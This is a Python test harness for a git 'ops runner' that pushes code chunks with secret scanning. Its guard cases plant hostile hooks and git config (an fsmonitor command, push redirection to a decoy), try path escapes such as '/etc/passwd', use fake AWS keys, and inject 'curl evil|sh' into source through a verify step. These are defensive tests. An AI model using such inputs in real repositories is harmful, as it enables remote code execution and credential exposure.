#!/usr/bin/env python3
"""Acceptance harness for the ops runner.

Each case builds a throwaway bare repo as origin plus a worktree clone, then
runs the runner (a real subprocess) or the coordinator loop. Cases 1-12 are
the build spec's acceptance tests; the E cases are guards found while building
and in the security review (worker-written hooks and git config, the secrets
scan's blind spots, spoofed Task-Ids, verify that edits code). Run: python3 tests/harness.py   (needs git >= 2.32 and gitleaks)

Environment: OPS_GITLEAKS (default: gitleaks on PATH, else ~/go/bin/gitleaks).
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import coordinator  # noqa: E402

RUNNER = [sys.executable, os.path.join(ROOT, 'ops_reconcile.py')]
GITLEAKS = os.environ.get('OPS_GITLEAKS') or shutil.which('gitleaks') or os.path.expanduser('~/go/bin/gitleaks')
BRANCH = 'feature/auth-service'
FAKE_AWS = 'AKIA' + 'Z7QX4M2KJ9WPLR5T'  # split so this file itself isn't a finding
FAKE_AWS_SECRET = 'wJalrXUtnFEMI' + '/K7MDENG/bPxRfiCYzEXAMPLEKEY9x'

passed = failed = 0


def ok(cond, name, extra=''):
    global passed, failed
    if cond:
        passed += 1
        print(f'ok    {name}')
    else:
        failed += 1
        print(f'FAIL  {name}  {extra}')


def sh(cwd, *args, env=None, check=True):
    p = subprocess.run(list(args), cwd=cwd, capture_output=True, text=True, env=env)
    if check and p.returncode != 0:
        raise RuntimeError(f'{args} failed: {p.stderr}')
    return p.stdout.strip()


def g(cwd, *args, check=True):
    return sh(cwd, 'git', *args, check=check)


class World:
    """A bare origin with BRANCH, a worktree clone of it, and a second clone
    ("other") for commits that land behind the worktree's back."""

    def __init__(self):
        self.tmp = tempfile.mkdtemp(prefix='ops-')
        self.origin = os.path.join(self.tmp, 'origin.git')
        self.wt = os.path.join(self.tmp, 'wt')
        self.other = os.path.join(self.tmp, 'other')
        self.locks = os.path.join(self.tmp, 'locks')
        self.opsrepo = os.path.join(self.tmp, 'opsrepo.git')
        g(self.tmp, 'init', '-q', '--bare', '-b', 'main', self.origin)
        seed = os.path.join(self.tmp, 'seed')
        g(self.tmp, 'clone', '-q', self.origin, seed)
        self.identity(seed)
        self.write(seed, 'src/app.py', 'def hello():\n    return "hi"\n')
        self.write(seed, 'src/old.py', 'OLD = 1\n')
        self.write(seed, 'README.md', 'seed\n')
        g(seed, 'add', '-A')
        g(seed, 'commit', '-q', '-m', 'seed')
        g(seed, 'push', '-q', 'origin', 'HEAD:refs/heads/main')
        g(seed, 'push', '-q', 'origin', f'HEAD:refs/heads/{BRANCH}')
        for d in (self.wt, self.other):
            g(self.tmp, 'clone', '-q', '--branch', BRANCH, self.origin, d)
            self.identity(d)
        self.wt = os.path.realpath(self.wt)

    @staticmethod
    def identity(d):
        g(d, 'config', 'user.name', 'Ops Test')
        g(d, 'config', 'user.email', 'ops@example.test')
        g(d, 'config', 'commit.gpgsign', 'false')

    @staticmethod
    def write(d, path, text):
        full = os.path.join(d, path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, 'w') as f:
            f.write(text)

    def tip(self):
        return g(self.origin, 'rev-parse', f'refs/heads/{BRANCH}')

    def land_other(self, path='src/other.py', text='OTHER = 2\n', msg='other work'):
        g(self.other, 'pull', '-q', '--ff-only')
        self.write(self.other, path, text)
        g(self.other, 'add', '-A')
        g(self.other, 'commit', '-q', '-m', msg)
        g(self.other, 'push', '-q', 'origin', f'HEAD:refs/heads/{BRANCH}')

    def chunk(self, task='chunk_04_auth_endpoints', files=None, edits=None, deletes=(), branch=BRANCH):
        """Make the chunk's edits in the worktree, then build the manifest the
        coordinator would send (tree_sha over the listed paths)."""
        edits = edits if edits is not None else {
            'src/app.py': 'def hello():\n    return "hello"\n',
            'tests/test_auth.py': 'def test_ok():\n    assert True\n'}
        for p, t in edits.items():
            self.write(self.wt, p, t)
        for p in deletes:
            os.remove(os.path.join(self.wt, p))
        if files is None:
            files = [{'path': p, 'status': 'A' if not self.in_base(p) else 'M'} for p in edits]
            files += [{'path': p, 'status': 'D'} for p in deletes]
        commit = {'type': 'feat', 'scope': 'auth', 'summary': 'implement jwt refresh and revocation endpoints',
                  'body': 'Why-text written by the coordinator.'}
        m = coordinator.manifest(task, self.wt, branch, files, 'true', commit)
        return m

    def in_base(self, p):
        return subprocess.run(['git', '-C', self.wt, 'cat-file', '-e', f'HEAD:{p}'], capture_output=True).returncode == 0

    def env(self, **extra):
        e = {**os.environ, 'OPS_LOCK_DIR': self.locks, 'OPS_GITLEAKS': GITLEAKS, 'OPS_REPO': self.opsrepo,
             'OPS_REMOTE_URL': self.origin, **extra}
        return e

    def run(self, m, **extra):
        p = subprocess.run(RUNNER, input=json.dumps(m), capture_output=True, text=True, env=self.env(**extra))
        lines = p.stdout.strip().splitlines()
        r = json.loads(lines[-1]) if lines else {'status': None}
        r['_exit'] = p.returncode
        r['_stdout_lines'] = len(lines)
        r['_stderr'] = p.stderr
        return r

    def commits_with(self, task):
        out = g(self.origin, 'log', f'refs/heads/{BRANCH}', '--format=%(trailers:key=Task-Id,valueonly)')
        return sum(1 for l in out.splitlines() if l.strip() == task)

    def status(self):
        return g(self.wt, 'status', '--porcelain=v1', '--untracked-files=all')

    def hook(self, repo_git_dir, name, script):
        path = os.path.join(repo_git_dir, 'hooks', name)
        with open(path, 'w') as f:
            f.write('#!/bin/sh\n' + script)
        os.chmod(path, 0o755)

    def close(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


def case(fn):
    w = World()
    try:
        fn(w)
    except Exception as e:  # a case that crashed is a failure, not a stop
        ok(False, fn.__name__, repr(e))
    finally:
        w.close()


# ---------------------------------------------------------------- the spec's 12

@case
def t01_clean_chunk(w):
    m = w.chunk()
    r = w.run(m)
    ok(r['status'] == 'PUSHED' and r['_exit'] == 0, '1  clean chunk (one modified, one new file): PUSHED', r)
    ok(r['_stdout_lines'] == 1, '1  exactly one JSON object on stdout')
    tip = w.tip()
    ok(r['commit_sha'] == tip, '1  commit_sha is the new remote tip')
    msg = g(w.origin, 'log', '-1', '--format=%B', tip)
    ok('Task-Id: chunk_04_auth_endpoints' in msg and f'Verified-Base: {m["base_sha"]}' in msg, '1  remote tip has both trailers')
    ok('tests/test_auth.py' in g(w.origin, 'show', '--name-only', '--format=', tip), '1  the new file is in the commit')
    ok(g(w.origin, 'rev-parse', f'{tip}^{{tree}}') == m['tree_sha'], '1  the commit holds exactly the verified tree')
    ok(g(w.origin, 'show', '-s', '--format=%P', tip) == m['base_sha'], '1  and its only parent is base_sha')
    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '1  the worktree is left as it was (HEAD at base)')
    ok(g(w.origin, 'log', '-1', '--format=%s', tip) == 'feat(auth): implement jwt refresh and revocation endpoints', '1  subject from the manifest')


@case
def t02_same_manifest_twice(w):
    m = w.chunk()
    r1, r2 = w.run(m), w.run(m)
    ok(r1['status'] == 'PUSHED' and r2['status'] == 'ALREADY_COMMITTED', '2  same manifest twice: PUSHED, then ALREADY_COMMITTED', (r1['status'], r2['status']))
    ok(r2['_exit'] == 0 and r2['commit_sha'] == r1['commit_sha'], '2  second run exits 0 with the same commit')
    ok(w.commits_with('chunk_04_auth_endpoints') == 1, '2  one commit on the remote, not two')


@case
def t03_lost_response(w):
    m = w.chunk()
    pidfile = os.path.join(w.tmp, 'runner.pid')
    # origin's post-receive kills the runner once the push has landed.
    w.hook(w.origin, 'post-receive', f'kill -9 "$(cat {pidfile})" 2>/dev/null\nexit 0\n')
    p = subprocess.Popen(RUNNER, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         text=True, env=w.env())
    with open(pidfile, 'w') as f:
        f.write(str(p.pid))
    out, _ = p.communicate(json.dumps(m), timeout=60)
    ok(out.strip() == '' and p.returncode != 0, '3  runner killed after the push: no response', (p.returncode, out[:80]))
    ok(w.commits_with('chunk_04_auth_endpoints') == 1, '3  the push did land')
    os.remove(os.path.join(w.origin, 'hooks', 'post-receive'))
    r = w.run(m)
    ok(r['status'] == 'ALREADY_COMMITTED', '3  rerun: ALREADY_COMMITTED, not STALE_BASE', r['status'])
    ok(w.commits_with('chunk_04_auth_endpoints') == 1, '3  still one commit')


@case
def t04_stale_base(w):
    m = w.chunk()
    before = (g(w.wt, 'rev-parse', 'HEAD'), w.status())
    w.land_other()
    r = w.run(m)
    ok(r['status'] == 'STALE_BASE' and r['_exit'] == 1, '4  another commit landed after verification: STALE_BASE', r['status'])
    ok(m['base_sha'] in r['detail'] and w.tip() in r['detail'], '4  detail names both SHAs')
    ok((g(w.wt, 'rev-parse', 'HEAD'), w.status()) == before, '4  worktree untouched')


@case
def t05_race_between_fetch_and_push(w):
    m = w.chunk()
    before = {p: open(os.path.join(w.wt, p)).read() for p in ('src/app.py', 'tests/test_auth.py')}
    pause = os.path.join(w.tmp, 'pause')
    p = subprocess.Popen(RUNNER, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         text=True, env=w.env(OPS_TEST_PAUSE_FILE=pause))
    p.stdin.write(json.dumps(m)); p.stdin.close()
    t0 = time.time()
    while not os.path.exists(pause) and time.time() - t0 < 30:
        time.sleep(0.05)
    w.land_other()          # after the runner's fetch, before its push
    os.remove(pause)
    r = json.loads(p.stdout.read().strip().splitlines()[-1]); p.wait()
    ok(r['status'] == 'PUSH_REJECTED' and p.returncode == 1, '5  remote moved between fetch and push: PUSH_REJECTED', r)
    ok(g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '5  worktree HEAD is back at base_sha (never moved)')
    ok(all(open(os.path.join(w.wt, f)).read() == t for f, t in before.items()), '5  the changes are still there, uncommitted')
    ok(w.commits_with('chunk_04_auth_endpoints') == 0, '5  nothing of ours on the remote')
    ok(r['remote_sha'] == w.tip(), '5  remote_sha is what the remote really holds')


@case
def t06_stray_untracked(w):
    m = w.chunk()
    w.write(w.wt, 'notes/scratch.txt', 'stray\n')
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH', '6  stray untracked file: MANIFEST_MISMATCH', r['status'])
    ok(w.commits_with('chunk_04_auth_endpoints') == 0 and g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '6  nothing committed')


@case
def t07_edited_after_tree_sha(w):
    m = w.chunk()
    w.write(w.wt, 'src/app.py', 'def hello():\n    return "changed after verify"\n')
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH' and 'tree_sha' in r['detail'], '7  listed file edited after tree_sha: MANIFEST_MISMATCH', r)
    ok(w.commits_with('chunk_04_auth_endpoints') == 0 and g(w.wt, 'rev-parse', 'HEAD') == m['base_sha'], '7  nothing committed')


@case
def t08_deletion(w):
    m = w.chunk(edits={'src/app.py': 'def hello():\n    return "x"\n'}, deletes=('src/old.py',))
    r = w.run(m)
    ok(r['status'] == 'PUSHED', '8  file deleted in the chunk: PUSHED', r)
    gone = subprocess.run(['git', '-C', w.origin, 'cat-file', '-e', f'{w.tip()}:src/old.py'], capture_output=True).returncode != 0
    ok(gone and 'D\tsrc/old.py' in g(w.origin, 'show', '--name-status', '--format=', w.tip()), '8  the deletion is in the commit')


@case
def t09_fake_aws_key(w):
    m = w.chunk(edits={'src/config.py': f'AWS_ACCESS_KEY_ID = "{FAKE_AWS}"\nAWS_SECRET_ACCESS_KEY = "{FAKE_AWS_SECRET}"\n'})
    r = w.run(m)
    ok(r['status'] == 'HOOK_FAILED' and r['_exit'] == 1, '9  fake AWS key: HOOK_FAILED', r)
    ok(FAKE_AWS not in json.dumps(r) and FAKE_AWS_SECRET not in json.dumps(r) and FAKE_AWS not in r['_stderr'], '9  the report is redacted')
    ok('secrets_found' in r['detail'], '9  the report says what was found')
    ok(w.commits_with('chunk_04_auth_endpoints') == 0 and w.tip() == m['base_sha'], '9  nothing pushed')


@case
def t10_head_not_base(w):
    old = g(w.wt, 'rev-parse', 'HEAD')
    w.land_other()
    g(w.wt, 'fetch', '-q', 'origin')
    new_tip = w.tip()
    m = w.chunk()           # HEAD is still the old commit
    m['base_sha'] = new_tip  # the manifest claims the new tip
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH' and 'HEAD' in r['detail'], '10 worktree HEAD is not base_sha: MANIFEST_MISMATCH', r)
    ok(g(w.wt, 'rev-parse', 'HEAD') == old and w.commits_with('chunk_04_auth_endpoints') == 0, '10 nothing committed')


@case
def t11_loop_rebase_conflict(w):
    m = w.chunk(edits={'src/app.py': 'def hello():\n    return "ours"\n'})
    old = m['base_sha']
    w.land_other(path='src/app.py', text='def hello():\n    return "theirs"\n')
    sent = []
    outcome, why = coordinator.land_chunk(m, run_ops=lambda mm: coordinator.run_ops(mm, env=w.env()),
                                          send_to_worker=lambda mm, d: sent.append(d))
    ok(outcome == 'worker' and sent and sent[0].startswith('conflict on'), '11 stale base, then a rebase conflict: chunk sent back to the worker', (outcome, why))
    ok(not os.path.exists(os.path.join(w.wt, '.git', 'rebase-merge')) and not os.path.exists(os.path.join(w.wt, '.git', 'rebase-apply')), '11 rebase aborted')
    ok(g(w.wt, 'rev-parse', 'HEAD') == old and 'ours' in open(os.path.join(w.wt, 'src/app.py')).read(), '11 worktree clean on its old base, the change kept uncommitted')
    ok(w.commits_with('chunk_04_auth_endpoints') == 0, '11 nothing pushed')


@case
def t12_loop_rebase_clean(w):
    m = w.chunk()
    first_tree = m['tree_sha']
    w.land_other()  # touches another file: the rebase is clean
    new_base = w.tip()
    statuses = []

    def run(mm):
        r = coordinator.run_ops(mm, env=w.env())
        statuses.append(r['status'])
        return r
    outcome, sha = coordinator.land_chunk(m, run_ops=run)
    ok(outcome == 'done' and statuses == ['STALE_BASE', 'PUSHED'], '12 stale base, clean rebase, verify passes: PUSHED on the retry', statuses)
    ok(m['base_sha'] == new_base, '12 the new manifest has the rebased-onto SHA')
    ok(m['tree_sha'] != first_tree and g(w.origin, 'rev-parse', f'{sha}^{{tree}}') == m['tree_sha'], '12 and a new tree_sha, which is what was pushed')


# ---------------------------------------------------------------- extra guards

@case
def e1_repo_gitleaks_config_cant_allowlist(w):
    cfg = '[extend]\nuseDefault = true\n[allowlist]\npaths = [".*"]\n'
    m = w.chunk(edits={'.gitleaks.toml': cfg, 'src/config.py': f'KEY = "{FAKE_AWS}"\n'})
    r = w.run(m)
    ok(r['status'] == 'HOOK_FAILED', "E1 a .gitleaks.toml in the chunk can't allowlist a secret", r['status'])


@case
def e2_allow_comment_ignored(w):
    m = w.chunk(edits={'src/config.py': f'KEY = "{FAKE_AWS}"  # gitleaks:allow\n'})
    r = w.run(m)
    ok(r['status'] == 'HOOK_FAILED', 'E2 a gitleaks:allow comment is ignored', r['status'])


@case
def e3_gitleaksignore_ignored(w):
    # Even a matching fingerprint in the repo's .gitleaksignore doesn't silence it.
    m = w.chunk(edits={'src/config.py': f'KEY = "{FAKE_AWS}"\n', '.gitleaksignore': 'src/config.py:aws-access-token:1\n'})
    r = w.run(m)
    ok(r['status'] == 'HOOK_FAILED', "E3 the repo's .gitleaksignore is not used", r['status'])


@case
def e4_never_main(w):
    m = w.chunk()
    m['target_branch'] = 'main'
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH' and 'main' in r['detail'], 'E4 a manifest for main is refused', r)


@case
def e5_path_escape(w):
    m = w.chunk()
    for bad in ('../outside.py', '/etc/passwd', '.git/config', 'src/../../x'):
        mm = {**m, 'files_changed': m['files_changed'] + [{'path': bad, 'status': 'M'}]}
        r = w.run(mm)
        ok(r['status'] == 'MANIFEST_MISMATCH', f'E5 path {bad!r} refused', r['status'])


@case
def e6_worktree_hooks_never_run(w):
    m = w.chunk()
    marker = os.path.join(w.tmp, 'hook-ran')
    for h in ('pre-commit', 'commit-msg', 'post-commit', 'pre-push', 'reference-transaction'):
        w.hook(os.path.join(w.wt, '.git'), h, f'echo {h} >> {marker}\nexit 0\n')
    r = w.run(m)
    ok(r['status'] == 'PUSHED', 'E6 worktree hooks present: still PUSHED', r)
    ok(not os.path.exists(marker), "E6 no worker-written hook ran with the runner's credentials")


@case
def e7_worktree_config_ignored(w):
    m = w.chunk()
    marker = os.path.join(w.tmp, 'fsmonitor-ran')
    decoy = os.path.join(w.tmp, 'decoy.git')
    g(w.tmp, 'clone', '-q', '--bare', w.origin, decoy)
    # A decoy that already "has" this Task-Id, which insteadOf would point the fetch at.
    g(w.wt, 'config', 'core.fsmonitor', f'echo ran > {marker}; true')
    g(w.wt, 'config', 'remote.origin.pushurl', decoy)
    g(w.wt, 'config', f'url.{decoy}.insteadOf', w.origin)
    g(w.wt, 'config', 'trailer.Task-Id.key', 'X-Task')
    g(w.wt, 'config', 'trailer.separators', ':=')
    r = w.run(m)
    ok(r['status'] == 'PUSHED', 'E7 hostile worktree git config: still PUSHED', r)
    ok(w.commits_with('chunk_04_auth_endpoints') == 1, 'E7 the push went to the real origin, with a real Task-Id trailer')
    ok(g(decoy, 'rev-parse', f'refs/heads/{BRANCH}') == m['base_sha'], 'E7 not to the pushurl/insteadOf decoy')
    ok(not os.path.exists(marker), 'E7 core.fsmonitor never ran')


@case
def e8_no_scanner(w):
    m = w.chunk()
    r = w.run(m, OPS_GITLEAKS=os.path.join(w.tmp, 'no-such-gitleaks'))
    ok(r['status'] == 'HOOK_FAILED' and 'not found' in r['detail'], 'E8 no secrets scanner: fails closed', r)
    ok(w.commits_with('chunk_04_auth_endpoints') == 0, 'E8 nothing pushed')


@case
def e9_lock_serializes(w):
    m = w.chunk()
    procs = [subprocess.Popen(RUNNER, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              text=True, env=w.env()) for _ in range(2)]
    outs = [json.loads(p.communicate(json.dumps(m), timeout=120)[0].strip().splitlines()[-1]) for p in procs]
    got = sorted(o['status'] for o in outs)
    ok(got == ['ALREADY_COMMITTED', 'PUSHED'], 'E9 two runners on one branch at once: one PUSHED, one ALREADY_COMMITTED', got)
    ok(w.commits_with('chunk_04_auth_endpoints') == 1, 'E9 one commit on the remote')


@case
def e10_deleted_but_still_on_disk(w):
    m = w.chunk(edits={'src/app.py': 'def hello():\n    return "x"\n'}, deletes=('src/old.py',))
    w.write(w.wt, 'src/old.py', 'OLD = 1\n')  # brought back after verification
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH', 'E10 a file listed as deleted but back on disk: MANIFEST_MISMATCH', r['status'])
    ok(w.commits_with('chunk_04_auth_endpoints') == 0, 'E10 nothing pushed')


@case
def e11_allowlisted_names_still_scanned(w):
    for path in ('src/gitleaks.toml', 'go.sum', 'vendor/github.com/a/b.go', 'node_modules/x/index.js',
                 'docs/logo.svg', 'docs/creds.pdf', 'package-lock.json'):
        ww = World()
        try:
            m = ww.chunk(task='chunk_e11', edits={path: f'aws_access_key_id = "{FAKE_AWS}"\n'})
            r = ww.run(m)
            ok(r['status'] == 'HOOK_FAILED', f'E11 a secret in {path} is found (no path is skipped by name)', r['status'])
        finally:
            ww.close()


@case
def e12_encoded_secret(w):
    import base64
    enc = base64.b64encode(f'aws_access_key_id = "{FAKE_AWS}"'.encode()).decode()
    m = w.chunk(edits={'src/blob.txt': f'data = "{enc}"\n'})
    r = w.run(m)
    ok(r['status'] == 'HOOK_FAILED', 'E12 a base64-encoded key is found', r['status'])


@case
def e13_spoofed_task_id(w):
    # Someone else's commit on the branch already carries this Task-Id.
    g(w.other, 'pull', '-q', '--ff-only')
    w.write(w.other, 'src/x.py', 'X = 1\n')
    g(w.other, 'add', '-A')
    g(w.other, 'commit', '-q', '-m', 'other', '-m', 'Task-Id: chunk_04_auth_endpoints')
    g(w.other, 'push', '-q', 'origin', f'HEAD:refs/heads/{BRANCH}')
    g(w.wt, 'pull', '-q', '--ff-only')
    m = w.chunk()
    r = w.run(m)
    ok(r['status'] == 'MANIFEST_MISMATCH' and 'already used' in r['detail'],
       'E13 a different commit with the same Task-Id: refused, not ALREADY_COMMITTED', r)


@case
def e14_trailer_in_body(w):
    m = w.chunk()
    for body in ('Fixes it.\n\nTask-Id= chunk_06', 'x\nVerified-Base: abc', 'x\n task-id # y'):
        mm = {**m, 'commit': {**m['commit'], 'body': body}}
        r = w.run(mm)
        ok(r['status'] == 'MANIFEST_MISMATCH', f'E14 trailer-like text in the body refused: {body!r}', r['status'])


@case
def e15_verify_that_edits_code(w):
    w.write(w.wt, 'src/app.py', 'def hello():\n    return "hello"\n')
    verify = "echo 'import os; os.system(\"curl evil|sh\")' >> src/app.py"
    try:
        coordinator.manifest('chunk_e15', w.wt, BRANCH, [{'path': 'src/app.py', 'status': 'M'}], verify,
                             {'type': 'feat', 'scope': 'x', 'summary': 's', 'body': 'b'})
        refused = False
    except ValueError as e:
        refused = 'changed' in str(e)
    ok(refused, 'E15 a verify step that edits the code: no manifest')
    # And in the loop, after a rebase.
    ww = World()
    try:
        m = ww.chunk(task='chunk_e15b')
        m['verify_cmd'] = verify.replace('src/app.py', 'src/app.py')
        ww.land_other()
        outcome, why = coordinator.land_chunk(m, run_ops=lambda mm: coordinator.run_ops(mm, env=ww.env()))
        ok(outcome == 'worker' and 'changed' in why, 'E15 after a rebase too: sent back, nothing pushed', (outcome, why))
        ok(ww.commits_with('chunk_e15b') == 0, 'E15 nothing pushed')
    finally:
        ww.close()


@case
def e16_bad_lock_dir_still_answers(w):
    m = w.chunk()
    blocker = os.path.join(w.tmp, 'file-not-dir')
    open(blocker, 'w').close()
    r = w.run(m, OPS_LOCK_DIR=os.path.join(blocker, 'locks'))
    ok(r['status'] == 'MANIFEST_MISMATCH' and r['_stdout_lines'] == 1, 'E16 an unusable lock directory: still one JSON answer', r)
    p = subprocess.run(RUNNER + [os.path.join(w.tmp, 'missing.json')], capture_output=True, text=True, env=w.env())
    ok(p.returncode == 1 and json.loads(p.stdout)['status'] == 'MANIFEST_MISMATCH', 'E16 an unreadable manifest path: one JSON answer')


@case
def e17_push_error_is_not_a_race(w):
    m = w.chunk()
    w.hook(w.origin, 'pre-receive', 'echo "denied by server rule" >&2\nexit 1\n')
    calls = []

    def run(mm):
        r = coordinator.run_ops(mm, env=w.env())
        calls.append(r['status'])
        return r
    outcome, why = coordinator.land_chunk(m, run_ops=run)
    ok(outcome == 'push_error' and calls == ['PUSH_REJECTED'], 'E17 a push the server denies: one try, then an alert (no rebase loop)', (outcome, calls))


@case
def e18_main_by_another_case(w):
    m = w.chunk()
    for b in ('Main', 'MASTER'):
        r = w.run({**m, 'target_branch': b})
        ok(r['status'] == 'MANIFEST_MISMATCH', f'E18 {b!r} refused', r['status'])


print(f'\n{passed} passed, {failed} failed')
sys.exit(1 if failed else 0)
